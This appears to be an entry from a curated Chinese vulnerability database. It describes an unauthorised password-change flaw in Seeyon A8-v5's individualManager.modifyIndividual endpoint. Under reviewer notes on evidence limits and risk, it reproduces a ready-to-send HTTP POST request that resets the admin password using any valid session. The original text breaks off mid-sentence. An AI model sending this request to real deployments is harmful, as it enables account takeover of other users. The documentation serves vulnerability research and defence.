---
source: "hatch 补库批 20260928"
title: "致远A8-v5 individualManager.modifyIndividual横向越权改密"
product: "致远A8-v5"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "A8-v5；原密码验证与修改步骤分离"
prerequisites: "明确有效JSESSIONID，获取会话不必然需要撞库"
side_effects: "请求可能删除/覆盖数据、修改账号或持久改变业务状态"
review_date: "2026-10-02"
source_status: "unknown"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/OA%E5%8A%9E%E5%85%AC/%E8%87%B4%E8%BF%9COA/%E8%87%B4%E8%BF%9COA%20A8-v5%20%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81%E4%BF%AE%E6%94%B9.md"
id: "vw-b74e729ebaa0219550107681"
entity_id: "ve-b74e729ebaa0219550107681"
schema_version: "1"
---

# 致远A8-v5 individualManager.modifyIndividual横向越权改密

## 条目说明

- 对象与具体问题：致远A8-v5；individualManager.modifyIndividual横向越权改密
- 版本、配置及部署条件：A8-v5；原密码验证与修改步骤分离
- 认证与权限前提：明确有效JSESSIONID，获取会话不必然需要撞库
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- 改密请求和individualName目标字段明确，但无响应/后置验证，尾句截断
- 把合法会话由撞库得出当必要前提不当，登录态才是条件
- HTTP头间多空行损坏；敏感凭据改变应标侵入式

## 操作风险

请求可能删除/覆盖数据、修改账号或持久改变业务状态。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。凭据示例如含星号，仅保留首尾用于说明，不能直接使用。

## 技术资料与来源记录

一、漏洞简介
------------

致远A8-V5在设计时存在逻辑错误，在上一步对原始密码进行验证后，下一步不再检测原始密码，从而直接修改用户密码，导致平行权限的越权漏洞。

二、漏洞影响
------------

致远OA A8-v5

三、复现过程
------------

POST如下数据

```http
    POST /seeyon/individualManager.do?method=modifyIndividual HTTP/1.0

    Accept: text/html, application/xhtml+xml, */*

    Referer: http://www.0-sec.org/seeyon/individualManager.do?method=managerFrame

    Accept-Language: zh-CN

    User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko

    Content-Type: application/x-www-form-urlencoded

    Proxy-Connection: Keep-Alive

    Pragma: no-cache

    Content-Length: 86

    DNT: 1

    Host: www.0-sec.org

    Cookie: JSESSIONID=DA71A65B3AAD45823A1FADAB80A3E685; Hm_lvt_49c0fa7f96aa0a5fb95c62909d5190a6=1419221849,1419232608; avatarImageUrl=8469117046183055270; loginPageURL="/main.do"



    individualName=admin&formerpassword=123456&nowpassword=wy123456&validatepass=wy123456

individualName为用户名
```

注意，此处需要以一个合法的JSESSIONID发送如上数据即可修改任意用户密码，合法的JSESSIONID由撞库得出。

本次证明演示中修改的用户为admin，修改
